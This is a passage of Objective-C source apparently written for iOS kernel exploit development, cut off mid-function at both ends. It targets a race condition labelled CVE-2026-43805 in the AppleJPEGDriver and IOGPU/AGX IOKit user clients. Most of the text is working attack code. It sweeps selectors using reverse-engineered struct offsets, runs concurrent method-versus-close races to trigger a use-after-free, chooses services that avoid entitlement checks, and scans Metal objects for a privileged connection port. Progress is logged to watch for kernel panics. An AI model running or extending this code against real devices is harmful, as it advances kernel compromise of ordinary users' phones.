    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    IOSurfaceGetAllocSize_t iosAlloc = dlsym(iosH, "IOSurfaceGetAllocSize");
    IOSurfaceLock_t iosLock = dlsym(iosH, "IOSurfaceLock");
    IOSurfaceUnlock_t iosUnlock = dlsym(iosH, "IOSurfaceUnlock");
    IOSurfaceGetBaseAddress_t iosGetBase = dlsym(iosH, "IOSurfaceGetBaseAddress");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID || !iosAlloc || !iosLock || !iosUnlock || !iosGetBase) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    NSDictionary *surfProps = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @1, @"IOSurfaceBytesPerRow": @64,
        @"IOSurfaceAllocSize": @4096,
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)surfProps);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)surfProps);
    if (!src || !dst) { [out appendString:@"STOP IOSurfaceCreate\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);

    // Write JPEG header into src.
    iosLock(src, 0, NULL);
    void *srcBase = iosGetBase(src);
    if (srcBase) {
        uint8_t *jp = (uint8_t *)srcBase;
        jp[0]=0xFF; jp[1]=0xD8; jp[2]=0xFF; jp[3]=0xE0;
        jp[4]=0x00; jp[5]=0x10; jp[6]=0x4A; jp[7]=0x46;
        jp[8]=0x49; jp[9]=0x46; jp[10]=0x00; jp[11]=0x01;
        jp[12]=0x01; jp[13]=0x00; jp[14]=0x00; jp[15]=0x01;
        jp[16]=0x00; jp[17]=0x01; jp[18]=0x00; jp[19]=0x00;
        jp[20]=0xFF; jp[21]=0xC0; jp[22]=0x00; jp[23]=0x0B;
        jp[24]=0x08; jp[25]=0x00; jp[26]=0x40; jp[27]=0x00;
        jp[28]=0x40; jp[29]=0x01; jp[30]=0x01; jp[31]=0x11;
        jp[32]=0x00; jp[60]=0xFF; jp[61]=0xD9;
    }
    iosUnlock(src, 0, NULL);

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; CFRelease(src); CFRelease(dst); return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    if (kr != KERN_SUCCESS) { [out appendFormat:@"OPEN FAIL\n"]; CFRelease(src); CFRelease(dst); return out; }
    [out appendFormat:@"conn: %u  src=%u dst=%u\n", conn, srcID, dstID];

    enum { kStruct = 0x1000 };
    // Try each sub-command at struct[0xd0] for sel=5.
    // Also set struct[0xd4]=0 (needed < 2 for common handler).
    int subCmds[] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 15, 16, 17, 18, 25};
    int nCmds = (int)(sizeof(subCmds) / sizeof(subCmds[0]));

    for (int i = 0; i < nCmds; i++) {
        uint8_t *buf = calloc(1, kStruct);
        uint32_t *u32 = (uint32_t *)buf;
        u32[0] = 64; u32[1] = 64; u32[5] = 64; u32[6] = 64;
        *(uint64_t *)(buf + 0x30) = srcID;
        *(uint64_t *)(buf + 0x38) = dstID;
        u32[0x12] = 1;
        *(uint32_t *)(buf + 0x80) = 0;
        // Sub-command at offset 0xd0 (from dispatch table RE).
        *(uint32_t *)(buf + 0xd0) = (uint32_t)subCmds[i];
        // Count/limit at offset 0xd4 and 0xd8 -- set to 0.
        *(uint32_t *)(buf + 0xd4) = 0;
        *(uint32_t *)(buf + 0xd8) = 0;
        // RE'd surface ID offsets from startDecoder decompile
        *(uint32_t *)(buf + 0x2ac) = srcID;
        *(uint32_t *)(buf + 0x2b0) = dstID;
        *(uint32_t *)(buf + 0x428) = 64;
        *(uint32_t *)(buf + 0x42c) = 64;

        uint8_t outStruct[kStruct];
        memset(outStruct, 0, sizeof(outStruct));
        size_t outCnt = sizeof(outStruct);
        kern_return_t r = pCall(conn, 5, NULL, 0, buf, kStruct,
                                NULL, NULL, outStruct, &outCnt);
        [out appendFormat:@"subCmd=%-3d -> 0x%08x", subCmds[i], (unsigned)r];
        if (r == 0) [out appendString:@" (OK!)"];
        else if ((unsigned)r == 0xe00002c2) [out appendString:@" BadArg"];
        else if ((unsigned)r == 0xe00002bc) [out appendString:@" Error"];
        else if ((unsigned)r == 0xe00002cc) [out appendString:@" 02cc"];
        else [out appendString:@" (NEW!)"];
        [out appendString:@"\n"];
        free(buf);
        if (r == 0) break;
    }

    pClose(conn);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"Read: NEW or OK = found startDecoder sub-command; then RE struct fields\n"];
    return out;
}

+ (NSString *)runP010RaceProbe {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 / CVE-2026-43805 IOKit race condition probe\n"];
    [out appendString:@"CVSS 9.8 -- race in IOKit shared state -> write kernel memory\n"];
    [out appendString:@"Method: call sel=4 and sel=5 concurrently from 2 threads\n"];
    [out appendString:@"Not KRW -- race trigger test only\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    NSDictionary *surfProps = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64*4),
        @"IOSurfaceAllocSize": @(64*64*4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)surfProps);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)surfProps);
    if (!src || !dst) { [out appendString:@"STOP IOSurfaceCreate\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);
    [out appendFormat:@"src=%u dst=%u\n", srcID, dstID];

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; CFRelease(src); CFRelease(dst); return out; }
    io_connect_t conn = 0;
    kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
    pRelease(service);
    if (kr != KERN_SUCCESS) { [out appendFormat:@"OPEN FAIL\n"]; CFRelease(src); CFRelease(dst); return out; }
    [out appendFormat:@"conn: %u\n", conn];

    // Build 0x1000 struct with RE'd field offsets.
    enum { kStruct = 0x1000 };
    uint8_t *buf = calloc(1, kStruct);
    *(uint32_t *)(buf + 0x2ac) = srcID;
    *(uint32_t *)(buf + 0x2b0) = dstID;
    *(uint32_t *)(buf + 0x428) = 64;
    *(uint32_t *)(buf + 0x42c) = 64;
    *(uint32_t *)(buf + 0x80) = 0;

    // Race: call sel=4 and sel=5 concurrently from 2 threads.
    __block kern_return_t r4 = 0xffffffff;
    __block kern_return_t r5 = 0xffffffff;
    __block BOOL done4 = NO;
    __block BOOL done5 = NO;

    dispatch_queue_t q = dispatch_queue_create("p010.race", DISPATCH_QUEUE_CONCURRENT);
    dispatch_group_t g = dispatch_group_create();

    dispatch_group_async(g, q, ^{
        uint8_t outS[kStruct]; size_t outC = sizeof(outS);
        r4 = pCall(conn, 4, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
        done4 = YES;
    });
    dispatch_group_async(g, q, ^{
        uint8_t outS[kStruct]; size_t outC = sizeof(outS);
        r5 = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
        done5 = YES;
    });

    // Wait up to 5 seconds.
    dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
    [out appendFormat:@"sel=4 -> 0x%08x%@  sel=5 -> 0x%08x%@\n",
     (unsigned)r4, done4 ? @"" : @" (timeout)", (unsigned)r5, done5 ? @"" : @" (timeout)"];

    if (r4 == 0 || r5 == 0) {
        [out appendString:@"RACE: one returned SUCCESS -- possible race win\n"];
    } else if ((unsigned)r4 == 0xe00002bc && (unsigned)r5 == 0xe00002cc) {
        [out appendString:@"SAME as serial -- no race triggered\n"];
    } else {
        [out appendFormat:@"NEW codes -- investigate\n"];
    }

    free(buf);
    pClose(conn);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If panic: race triggered kernel corruption -- do NOT re-tap\n"];
    return out;
}

+ (NSString *)runP010RaceAggressive {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 aggressive race -- 3 patterns, N=50 each\n"];
    [out appendString:@"CVE-2026-43805: IOKit race -> write kernel memory\n"];
    [out appendString:@"Not KRW -- race trigger test\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iosH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iosH) iosH = dlopen("/System/Library/PrivateFrameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!iokit || !iosH) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    IOSurfaceCreate_t iosCreate = dlsym(iosH, "IOSurfaceCreate");
    IOSurfaceGetID_t iosGetID = dlsym(iosH, "IOSurfaceGetID");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort ||
        !iosCreate || !iosGetID) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    NSDictionary *surfProps = @{
        @"IOSurfaceWidth": @64, @"IOSurfaceHeight": @64,
        @"IOSurfaceBytesPerElement": @4, @"IOSurfaceBytesPerRow": @(64*4),
        @"IOSurfaceAllocSize": @(64*64*4),
        @"IOSurfacePixelFormat": @((unsigned int)'BGRA'),
    };
    IOSurfaceRef src = iosCreate((__bridge CFDictionaryRef)surfProps);
    IOSurfaceRef dst = iosCreate((__bridge CFDictionaryRef)surfProps);
    if (!src || !dst) { [out appendString:@"STOP surface\n"]; return out; }
    uint32_t srcID = iosGetID(src);
    uint32_t dstID = iosGetID(dst);

    CFMutableDictionaryRef matching = pMatching("AppleJPEGDriver");
    io_service_t service = matching ? pGet(*pMainPort, matching) : 0;
    if (!service) { [out appendString:@"STOP service\n"]; CFRelease(src); CFRelease(dst); return out; }

    enum { kStruct = 0x1000 };

    // --- Pattern 1: burst-fire concurrent sel=4+sel=5 (N=50) ---
    [out appendString:@"\n--- Pattern 1: burst-fire sel4+sel5 (N=50) ---\n"];
    {
        io_connect_t conn = 0;
        kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
        if (kr != KERN_SUCCESS) { [out appendString:@"open fail\n"]; goto p2; }
        [out appendFormat:@"conn: %u\n", conn];

        uint8_t *buf = calloc(1, kStruct);
        *(uint32_t *)(buf + 0x2ac) = srcID;
        *(uint32_t *)(buf + 0x2b0) = dstID;
        *(uint32_t *)(buf + 0x428) = 64;
        *(uint32_t *)(buf + 0x42c) = 64;

        __block int okCount = 0;
        __block int errCount = 0;
        dispatch_queue_t q = dispatch_queue_create("p010.burst", DISPATCH_QUEUE_CONCURRENT);
        dispatch_group_t g = dispatch_group_create();

        for (int i = 0; i < 50; i++) {
            dispatch_group_async(g, q, ^{
                uint8_t outS[kStruct]; size_t outC = sizeof(outS);
                kern_return_t r = pCall(conn, 4, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
                if (r == 0) __sync_fetch_and_add(&okCount, 1);
                else __sync_fetch_and_add(&errCount, 1);
            });
            dispatch_group_async(g, q, ^{
                uint8_t outS[kStruct]; size_t outC = sizeof(outS);
                kern_return_t r = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
                if (r == 0) __sync_fetch_and_add(&okCount, 1);
                else __sync_fetch_and_add(&errCount, 1);
            });
        }
        dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        [out appendFormat:@"burst: ok=%d err=%d\n", okCount, errCount];
        free(buf);
        pClose(conn);
    }

    // --- Pattern 2: close+call race (N=50) ---
    [out appendString:@"\n--- Pattern 2: close+call race (N=50) ---\n"];
p2:
    {
        __block int okCount = 0;
        __block int errCount = 0;
        __block int panicCount = 0;
        dispatch_queue_t q = dispatch_queue_create("p010.close", DISPATCH_QUEUE_CONCURRENT);

        for (int i = 0; i < 50; i++) {
            io_connect_t conn = 0;
            kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
            if (kr != KERN_SUCCESS) continue;

            uint8_t *buf = calloc(1, kStruct);
            *(uint32_t *)(buf + 0x2ac) = srcID;
            *(uint32_t *)(buf + 0x2b0) = dstID;
            *(uint32_t *)(buf + 0x428) = 64;
            *(uint32_t *)(buf + 0x42c) = 64;

            dispatch_group_t g = dispatch_group_create();
            // Thread A: call sel=5
            dispatch_group_async(g, q, ^{
                uint8_t outS[kStruct]; size_t outC = sizeof(outS);
                kern_return_t r = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
                if (r == 0) __sync_fetch_and_add(&okCount, 1);
                else if ((unsigned)r == 0xe00002cc) __sync_fetch_and_add(&errCount, 1);
                else { __sync_fetch_and_add(&panicCount, 1); }
            });
            // Thread B: close connection simultaneously
            dispatch_group_async(g, q, ^{
                pClose(conn);
            });
            dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC));
            free(buf);
            // Don't pClose again -- already closed or closing
        }
        [out appendFormat:@"close+call: ok=%d err=%d new=%d\n", okCount, errCount, panicCount];
    }

    // --- Pattern 3: same-selector concurrent sel=5 (N=50) ---
    [out appendString:@"\n--- Pattern 3: same-selector sel=5 x50 concurrent ---\n"];
    {
        io_connect_t conn = 0;
        kern_return_t kr = pOpen(service, mach_task_self(), 0, &conn);
        if (kr != KERN_SUCCESS) { goto done; }
        [out appendFormat:@"conn: %u\n", conn];

        uint8_t *buf = calloc(1, kStruct);
        *(uint32_t *)(buf + 0x2ac) = srcID;
        *(uint32_t *)(buf + 0x2b0) = dstID;
        *(uint32_t *)(buf + 0x428) = 64;
        *(uint32_t *)(buf + 0x42c) = 64;

        __block int okCount = 0;
        __block int errCount = 0;
        __block int newCount = 0;
        dispatch_queue_t q = dispatch_queue_create("p010.same", DISPATCH_QUEUE_CONCURRENT);
        dispatch_group_t g = dispatch_group_create();

        for (int i = 0; i < 50; i++) {
            dispatch_group_async(g, q, ^{
                uint8_t outS[kStruct]; size_t outC = sizeof(outS);
                kern_return_t r = pCall(conn, 5, NULL, 0, buf, kStruct, NULL, NULL, outS, &outC);
                if (r == 0) __sync_fetch_and_add(&okCount, 1);
                else if ((unsigned)r == 0xe00002cc) __sync_fetch_and_add(&errCount, 1);
                else __sync_fetch_and_add(&newCount, 1);
            });
        }
        dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 10 * NSEC_PER_SEC));
        [out appendFormat:@"same-sel: ok=%d err=%d new=%d\n", okCount, errCount, newCount];
        free(buf);
        pClose(conn);
    }

done:
    pRelease(service);
    CFRelease(src);
    CFRelease(dst);
    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"If panic: race triggered -- do NOT re-tap. If new>0: investigate race window.\n"];
    return out;
}

// Checkpoint to Documents so a userspace kill still leaves last phase on disk.
static void p010Checkpoint(NSMutableString *out, NSString *phase) {
    NSString *line = [NSString stringWithFormat:@"CHK %@ @ %@\n", phase, [NSDate date]];
    [out appendString:line];
    NSLog(@"[P010] %@", line);
    NSString *dir = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
    if (!dir) return;
    NSString *path = [dir stringByAppendingPathComponent:@"p010_checkpoint.txt"];
    NSMutableString *disk = [NSMutableString stringWithContentsOfFile:path encoding:NSUTF8StringEncoding error:nil] ?: [NSMutableString string];
    [disk appendString:line];
    [disk writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:nil];
}

static BOOL p010MatchAGX(void *iokit,
                         IOServiceMatching_t pMatching,
                         IOServiceGetMatchingService_t pGet,
                         mach_port_t mainPort,
                         NSMutableString *out,
                         io_service_t *outService,
                         const char **outName) {
    // IOGPUDevice first on 26.6 -- AGX services match first but their open is
    // entitlement-gated (0xe00002c7). IOGPUDevice has no hard entitlement
    // block on newUserClient; the gpu-restricted gate is soft (two dispatch
    // tables, all selectors in both). See RE_P010_uaf_assessment.md §13.
    const char *svcNames[] = {
        "IOGPUDevice",
        "IOGPU",
        "AGXAcceleratorG11G_A0",
        "AGXAcceleratorG11",
        "AGXAccelerator",
        "AppleH11G",
    };
    int nNames = (int)(sizeof(svcNames) / sizeof(svcNames[0]));
    for (int i = 0; i < nNames; i++) {
        CFMutableDictionaryRef matching = pMatching(svcNames[i]);
        if (!matching) continue;
        io_service_t s = pGet(mainPort, matching);
        // IOServiceGetMatchingService consumes matching -- do NOT CFRelease
        if (!s) {
            [out appendFormat:@"match %s: none\n", svcNames[i]];
            continue;
        }
        [out appendFormat:@"match %s: FOUND\n", svcNames[i]];
        *outService = s;
        *outName = svcNames[i];
        return YES;
    }
    // Fallback: match on IOClass instead of IOProviderClass.
    // IOGPUDevice service may be registered with a different provider class.
    {
        CFMutableDictionaryRef dict =
            CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
                &kCFTypeDictionaryKeyCallBacks,
                &kCFTypeDictionaryValueCallBacks);
        CFDictionarySetValue(dict, CFSTR("IOClass"), CFSTR("IOGPUDevice"));
        io_service_t s = pGet(mainPort, dict);
        // IOServiceGetMatchingService consumes dict -- do NOT CFRelease
        if (s) {
            [out appendString:@"match IOClass=IOGPUDevice: FOUND\n"];
            *outService = s;
            *outName = "IOGPUDevice(IOClass)";
            return YES;
        }
        [out appendString:@"match IOClass=IOGPUDevice: none\n"];
    }
    // Metal only if match miss -- closing a shared UC after warm can kill the app.
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    [out appendFormat:@"Metal warm (match miss): %@\n", mtl ? [mtl name] : @"(nil)"];
    for (int i = 0; i < nNames; i++) {
        CFMutableDictionaryRef matching = pMatching(svcNames[i]);
        if (!matching) continue;
        io_service_t s = pGet(mainPort, matching);
        // IOServiceGetMatchingService consumes matching -- do NOT CFRelease
        if (!s) continue;
        [out appendFormat:@"match %s: FOUND (after Metal)\n", svcNames[i]];
        *outService = s;
        *outName = svcNames[i];
        return YES;
    }
    return NO;
}

+ (NSString *)runP010IOGPUBaseline {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 step A -- match + type0 open/close ONLY (no method, no race)\n"];
    [out appendString:@"Prior freeze: skip sel=0 / type sweep until this returns.\n"];
    p010Checkpoint(out, @"A0_enter");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pMainPort) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }
    p010Checkpoint(out, @"A1_dlsym_ok");

    io_service_t service = 0;
    const char *openedName = NULL;
    if (!p010MatchAGX(iokit, pMatching, pGet, *pMainPort, out, &service, &openedName)) {
        [out appendString:@"STOP no AGX/IOGPU service matched\n"];
        return out;
    }
    [out appendFormat:@"using service: %s\n", openedName];
    p010Checkpoint(out, @"A2_matched");

    // One open only -- type sweep / empty method previously hung the lab.
    io_connect_t conn = 0;
    p010Checkpoint(out, @"A3_before_open_type0");
    kern_return_t okr = pOpen(service, mach_task_self(), 0, &conn);
    [out appendFormat:@"IOServiceOpen type=0 -> 0x%08x conn=%u\n", (unsigned)okr, conn];
    if (okr != KERN_SUCCESS || !conn) {
        [out appendString:@"STOP open type0 failed -- do not race\n"];
        pRelease(service);
        p010Checkpoint(out, @"A3_open_fail");
        return out;
    }
    p010Checkpoint(out, @"A4_open_ok");

    kern_return_t cr = pClose(conn);
    [out appendFormat:@"IOServiceClose -> 0x%08x\n", (unsigned)cr];
    pRelease(service);
    p010Checkpoint(out, @"A5_close_ok");

    [out appendString:@"\nDONE baseline -- paste this text back\n"];
    [out appendString:@"Survived = match+open OK. No method called. Do not tap B yet.\n"];
    return out;
}

+ (NSString *)runP010IOGPUMethodCloseRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 step B -- method-vs-close N=1 (unlocked UC candidate)\n"];
    [out appendString:@"App-only die = userspace dead-port / MIG (NOT race signal).\n"];
    [out appendString:@"Device reboot/panic only = race SIGNAL (still not KRW). Do NOT re-tap.\n"];
    p010Checkpoint(out, @"B0_enter");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    if (!iokit) { [out appendString:@"STOP dlopen\n"]; return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceOpen_t pOpen = dlsym(iokit, "IOServiceOpen");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");
    if (!pMatching || !pGet || !pOpen || !pClose || !pRelease || !pCall || !pMainPort) {
        [out appendString:@"STOP dlsym\n"]; return out;
    }

    io_service_t service = 0;
    const char *openedName = NULL;
    if (!p010MatchAGX(iokit, pMatching, pGet, *pMainPort, out, &service, &openedName)) {
        [out appendString:@"STOP no AGX/IOGPU service matched\n"];
        return out;
    }
    [out appendFormat:@"using service: %s\n", openedName];

    // Prefer type that opened in baseline; re-sweep once, keep first success only.
    io_connect_t conn = 0;
    uint32_t openType = 0xffffffff;
    for (uint32_t t = 0; t <= 5; t++) {
        io_connect_t c = 0;
        kern_return_t kr = pOpen(service, mach_task_self(), t, &c);
        [out appendFormat:@"IOServiceOpen type=%u -> 0x%08x%s\n",
         t, (unsigned)kr, (kr == KERN_SUCCESS && c) ? " SUCCESS" : ""];
        if (kr == KERN_SUCCESS && c) {
            if (!conn) {
                conn = c;
                openType = t;
            } else {
                pClose(c);
            }
        }
    }
    if (!conn) {
        [out appendString:@"STOP no openable type\n"];
        pRelease(service);
        return out;
    }
    [out appendFormat:@"race conn=%u type=%u\n", conn, openType];
    p010Checkpoint(out, @"B1_open_ok");

    // N=1 only. Concurrent call+close on same port often EXC_BAD_ACCESS in userspace.
    __block unsigned lastCall = 0xffffffff, lastClose = 0xffffffff;
    dispatch_queue_t q = dispatch_queue_create("p010.iogpu.close", DISPATCH_QUEUE_CONCURRENT);
    dispatch_group_t g = dispatch_group_create();
    dispatch_group_async(g, q, ^{
        uint64_t sout = 0;
        uint32_t soutCnt = 1;
        lastCall = (unsigned)pCall(conn, 0, NULL, 0, NULL, 0, &sout, &soutCnt, NULL, NULL);
    });
    dispatch_group_async(g, q, ^{
        lastClose = (unsigned)pClose(conn);
    });
    dispatch_group_wait(g, dispatch_time(DISPATCH_TIME_NOW, 2 * NSEC_PER_SEC));
    p010Checkpoint(out, @"B2_race_returned");

    [out appendFormat:@"lastCall=0x%08x lastClose=0x%08x\n", lastCall, lastClose];
    pRelease(service);
    p010Checkpoint(out, @"B3_done");

    [out appendString:@"\nDONE race survived -- paste this text back\n"];
    [out appendString:@"Survived ≠ KRW. Panic-only would be race SIGNAL.\n"];
    return out;
}

+ (NSString *)runP010UAFPhase1 {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 UAF Phase 1 -- serial baseline + controlled race\n"];
    [out appendString:@"Goal: confirm race window. Kernel hang = UAF. Do NOT re-tap.\n"];
    p010Checkpoint(out, @"U1_enter");

    // Metal warm-up REQUIRED -- AGX is entitlement-restricted.
    // Direct IOServiceOpen returns kIOReturnNotPermitted.
    // Metal framework opens the AGX with its entitlements.
    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
    if (!mtl) {
        [out appendString:@"STOP: MTLCreateSystemDefaultDevice failed\n"];
        return out;
    }
    [out appendFormat:@"Metal device: %@\n", [mtl name]];
    p010Checkpoint(out, @"U1a_metal_ok");

    // Brute-force scan: walk full class hierarchy, test each small value as io_connect_t.
    io_connect_t mtlConn = 0;
    void *iokit2 = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall2 = iokit2 ? dlsym(iokit2, "IOConnectCallMethod") : NULL;
    Class mtlClass = object_getClass(mtl);
    unsigned int ivarCount = 0;
    Ivar *ivars = class_copyIvarList(mtlClass, &ivarCount);
    [out appendFormat:@"MTLDevice class: %s (%u ivars)\n", class_getName(mtlClass), ivarCount];
    for (unsigned int i = 0; i < ivarCount; i++) {
        const char *iname = ivar_getName(ivars[i]);
        const char *itype = ivar_getTypeEncoding(ivars[i]);
        ptrdiff_t ioffset = ivar_getOffset(ivars[i]);
        if (iname && ioffset > 0) {
            void *addr = (void *)((uintptr_t)mtl + ioffset);
            // Try to read as pointer-sized value
            uintptr_t val = *(uintptr_t *)addr;
            [out appendFormat:@"  ivar[%u] %s (%s) off=%td val=0x%lx\n",
             i, iname, itype ? itype : "?", ioffset, (unsigned long)val];
            // io_connect_t is a mach_port_t -- small integer, typically < 0x10000
            if (val != 0 && val < 0x10000) {
                if (strstr(iname, "connect") || strstr(iname, "Connect") ||
                    strstr(iname, "conn") || strstr(iname, "Conn") ||
                    strstr(iname, "port") || strstr(iname, "Port")) {
                    mtlConn = (io_connect_t)val;
                    [out appendFormat:@"  → candidate io_connect_t: %u\n", mtlConn];
                }
            }
        }
    }
    free(ivars);
    p010Checkpoint(out, @"U1b_ivars_scanned");

    if (!mtlConn) {
        // P009 path: unwrap Metal, create buffer, get resourceRef, scan for io_connect_t
        [out appendString:@"\n--- P009 path: IOGPU resource handle scan ---\n"];
        id unwrapped = mtl;
        for (int i = 0; i < 8; i++) {
            NSString *cn = NSStringFromClass([unwrapped class]);
            if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
            SEL sel = NSSelectorFromString(@"baseObject");
            if (![unwrapped respondsToSelector:sel]) break;
            id base = ((id (*)(id, SEL))objc_msgSend)(unwrapped, sel);
            if (!base || base == unwrapped) break;
            unwrapped = base;
        }
        [out appendFormat:@"unwrapped Metal: %s\n", NSStringFromClass([unwrapped class])];

        // Dump unwrapped device ivars
